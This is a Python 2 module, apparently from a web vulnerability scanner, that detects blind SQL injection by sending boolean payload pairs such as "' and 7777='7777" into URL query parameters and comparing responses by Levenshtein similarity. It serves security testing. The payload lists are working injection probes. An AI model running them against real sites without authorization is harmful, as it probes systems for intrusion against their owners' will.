# coding=utf-8
import request
import result
import Levenshtein
from color_printer import colors
import copy
import re
import os
import random
import time  

TrueFalsePayload1 = (
    #Single quotes
    "' and 7777;-- ",
    "' and 0=0;-- ",
    "' or 9999;-- ",
    "' and 0;-- ",

    #numeric
    " and 7777;-- ",
    " and 0=0;-- ",
    " or 9999;-- ",
    " and 0;-- ",

    #double quotes
    '" and 7777;-- ',
    '" and 0=0;-- ',
    '" or 9999;-- ',
    '" and 0;-- '
)
TrueFalsePayload2 = (
    #Single quotes
    ("' and 7777='7777",
    "' and 0='0",
    "' or 9999='9999",
    "' and 7777='7788"),

    #numeric
    (" and 7777=7777",
    " and 0=0",
    " or 9999=9999",
    " and 7777=7778"),

    #double quotes
    ('" and 7777="7777',
    '" and 0="0',
    '" or 7777="7777',
    '" and 7777="7778')
)
PayloadTuple = (
    "%s%sand%s%s%d%s=%s%d",
    "%s%sand%s%s%d%s=%s%d",
    "%s%sor%s%d=%d#",
    "%s%sand%s%s%d%s=%s%d"
)
Quote=(
    "'",
    '',
    '"'
    #"%bf%27"
)
Delimiter=(
    '+',
    '\t',
    '/**/',
    '\n'   
)

def get_payload_list():
    payloadList = []
    for j in Delimiter:
        for i in Quote:
            tmp = []
            for k in range(len(PayloadTuple)):
                s= ""
                d = random.randint(1,100000)
                if k%4 ==2:
                    s = PayloadTuple[k]%(i,j,j,d,d) 
                elif k%4 ==3:
                    s = PayloadTuple[k]%(i,j,j,i,d,i,i,d+1)   
                else:
                    s = PayloadTuple[k]%(i,j,j,i,d,i,i,d)  
                tmp.append(s)
            payloadList.append(tmp)
    return payloadList

TrueFalsePayload = get_payload_list()

#TrueFalsePayload = TrueFalsePayload2
class BSqliRspDiff():
    def __init__(self, req, eq_limit=0.98):
        self._req = copy.deepcopy(req)
        self._eq_limit = eq_limit
            
    def relative_compare(self, strA, strB):
        '''
            using Levenshtein algorithm to calculate similarity of strA and strB
        '''
        ratio = Levenshtein.ratio(strA,strB)
        if ratio >= self._eq_limit:
            #print "\nRatio:%f and result = True"%(ratio)
            #print "ratio:",ratio," eq_limit:0.98"," rst:",True
            return True
        else:
            #print "\nRatio:%f and result = False"%(ratio)
            #print "ratio:",ratio," eq_limit:0.98"," rst:",True
            return False
        print "ratio:",ratio," eq_limit:0.98"," rst:",True
            
    def response_diff(self):
        req = self._req
        #true/false response comparison
        for i in range(0,len(TrueFalsePayload)):
            trueStm1 = TrueFalsePayload[i][0]
            trueStm2 = TrueFalsePayload[i][1]
            trueStm3 = TrueFalsePayload[i][2]
            falseStm = TrueFalsePayload[i][3]
            
            trueQueryList1=request.get_payload_query_list(req._query,trueStm1)
            trueQueryList2=request.get_payload_query_list(req._query,trueStm2)
            trueQueryList3=request.get_payload_query_list(req._query,trueStm3)
            falseQueryList=request.get_payload_query_list(req._query,falseStm)

            for j in range(len(trueQueryList1)):
                tmpReq1 = copy.deepcopy(req)
                tmpReq2 = copy.deepcopy(req)
                tmpReq3 = copy.deepcopy(req)
                tmpReq4 = copy.deepcopy(req)

                #tmpReq1._query = trueQueryList1[j] 
                tmpReq2._query = trueQueryList2[j] 
                rsp1 = request.sendRequest(tmpReq1)
                rsp2 = request.sendRequest(tmpReq2)
                if rsp1 == None or rsp2 ==None:
                    return None
                cleanRsp = self.relative_compare(rsp1.content,rsp2.content)
                
                tmpReq4._query = falseQueryList[j] 
                rsp4 = request.sendRequest(tmpReq4)
                if rsp4 == None:
                    return None
                payloadRsp = self.relative_compare(rsp1.content,rsp4.content)  
                # payloadRsp = self.compare_response_diff(tmpReq1,tmpReq2)
                
                if cleanRsp == True and payloadRsp == False:
                    # find vuln and insert record into db
                    # code for insert db    
                    colors.yellow(  "**************************")
                    colors.yellow(  "* Find blind sqli vuln!")
                    colors.yellow(  "* URL:"+self._req._url)
                    colors.yellow(  "* Payload:"+falseStm)
                    colors.yellow(  "**************************"  )
                    return result.Result([tmpReq1,tmpReq2,tmpReq4],[rsp1,rsp2,rsp4],TrueFalsePayload[i])

                else:
                    tmpReq3._query = trueQueryList3[j] 
                    rsp3 = request.sendRequest(tmpReq3)
                    if rsp3 == None:
                        return None
                    orRsp = self.relative_compare(rsp3.content,rsp4.content) 
                    if cleanRsp == True and orRsp == False:
                        colors.yellow(  "**************************")
                        colors.yellow(  "* Find blind sqli vuln!")
                        colors.yellow(  "* URL:"+self._req._url)
                        colors.yellow(  "* Payload:"+falseStm)
                        colors.yellow(  "**************************")                                       
                        return result.Result([tmpReq1,tmpReq2,tmpReq3,tmpReq4],[rsp1,rsp2,rsp3,rsp4],TrueFalsePayload[i],vulnName='blind sqli',advice='use orm') 


def start(req): 
    bsi = BSqliRspDiff(req)
    return bsi.response_diff()
  
